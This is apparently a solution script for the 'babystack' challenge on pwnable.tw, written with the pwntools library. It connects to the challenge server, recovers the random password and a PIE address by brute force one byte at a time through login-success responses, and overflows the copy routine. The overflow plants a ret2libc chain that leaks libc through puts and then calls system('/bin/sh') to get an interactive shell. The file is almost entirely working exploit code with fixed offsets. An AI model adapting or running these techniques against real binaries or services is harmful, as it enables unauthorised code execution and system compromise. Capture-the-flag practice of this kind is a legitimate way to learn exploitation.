from pwn import *
import sys
import time

def _rand():
    r = ''
    for i in range (16):
        for j in range (1,256):
            s.sendline('1')
            s.recvuntil('Your passowrd :')
            s.sendline(r+chr(j))
            l = s.recvuntil('>>')
            if 'Login Success !' in l:
                sys.stdout.write('%02x'%(j))
                r += chr(j)
                s.sendline('1') ; s.recvuntil('>>')
                break
    r = r[::-1]
    sys.stdout.write('\n[*] random : ')
    for c in r: sys.stdout.write('%02x'%(ord(c)))
    sys.stdout.write('\n') ; return r[::-1]

def _leak():
    global random
    leak = ''
    buf = random + '1'*16
    for i in range (8):
        for j in range (1,256):
            if j == 10 : continue
            l = _login(buf+leak+chr(j), 0)
            if 'Login Success !' in l:
                sys.stdout.write('%02x'%(j))
                leak += chr(j)
                break
    sys.stdout.write('\n[*] leak : ')
    leak_ = leak[::-1]
    for c in leak_: sys.stdout.write('%02x'%(ord(c)))
    sys.stdout.write('\n') ; return leak

def _login(pw, flag):
    if flag == 0 : s.send('1'*16)
    else : s.sendline('1')
    s.recvuntil('Your passowrd :')
    if (len(pw) == 127):s.send(pw)
    else:s.sendline(pw)
    r = s.recvuntil('>>') #; print r
    if 'Login Success !' in r:
        s.sendline('1') ; s.recvuntil('>>')
    return r

def _copy(cp):
    s.send('3'*16)
    s.recvuntil('Copy :')
    if (len(cp) == 63):s.send(cp)
    else:s.sendline(cp)
    print s.recvuntil('>>')

def _set_flag():
    s.sendline('1') ; s.recvuntil('Your passowrd :')
    s.sendline('') ; s.recvuntil('>>')  #set flag = 1

def _set_flag2():
    s.sendline('1') ; s.recvuntil('>>')

def _exploit(buf):
    log.info('LOGIN') ; _login(buf, 0)
    _set_flag()
    log.info('COPY') ; _copy('C'*63)

puts_plt_offset = 0x0000000000000ae0
puts_got_offset = 0x0000000000201f60
pop_rdi_offset  = 0x00000000000010c3 #: pop rdi ; ret
main_offset     = 0x0000000000000ecf
libc_offset     = 0x000000000006f738
system_offset   = 0x0000000000045390
binsh_offset    = 0x000000000018c177

#start
#s = process('./babystack', env={'LD_PRELOAD':'./libc_64.so.6'})
s = remote('chall.pwnable.tw', 10205)
raw_input('>')

print s.recvuntil('>>')
random = _rand()
buf  = 'A'*64+random
log.info('LOGIN') ; _login(buf, 0)
_set_flag()
log.info('COPY') ; _copy('C'*63)    #1st copy

time.sleep(0.3)
s.send('1'*16) ; s.recvuntil('>>')

pie = _leak()

pie_base = u64(pie+'\x00'*2) - 0x1060
log.info('pie leak : '+ hex(pie_base))
pop_rdi  = pie_base + pop_rdi_offset
puts_got = pie_base + puts_got_offset
puts_plt = pie_base + puts_plt_offset
main = pie_base + main_offset

#exploit
buf = 'a'*64+random+'1'*16+'c'*8+'A'*8+p64(main)    #2nd ret of Stage-1
_exploit(buf)
_set_flag2()

buf = 'a'*64+random+'1'*16+'c'*8+'A'*7  #padding
_exploit(buf)
_set_flag2()

buf = 'a'*64+random+'1'*16+'c'*8+p64(puts_plt)  #1st ret of Stage-1
_exploit(buf)
s.sendline('2')             #trigger : leak libc & jmp main

time.sleep(0.2)
l = u64(s.recvuntil('>>')[1:7]+'\x00'*2)
s.sendline('1')
print s.recvuntil('>>')
print hex(l)

libc = l - libc_offset
log.info('libc :'+hex(libc))
system = libc + system_offset
binsh = libc + binsh_offset

random = _rand()

buf = 'A'*64+random+'1'*16+'B'*8+'C'*16+p64(system)
_exploit(buf[:-1])
_set_flag2()

buf  = 'A'*64+random+'1'*16+'B'*8+'C'*15
_exploit(buf)
_set_flag2()

buf  = 'A'*64+random+'1'*16+'B'*8+'C'*8+p64(binsh)
_exploit(buf)
_set_flag2()

buf  = 'A'*64+random+'1'*16+'B'*8+'C'*7
_exploit(buf)
_set_flag2()

buf  = 'A'*64+random+'1'*16+'B'*8+p64(pop_rdi)
_exploit(buf)

s.sendline('2') #trigger
s.interactive()
raw_input('[*] Done?')
s.close()
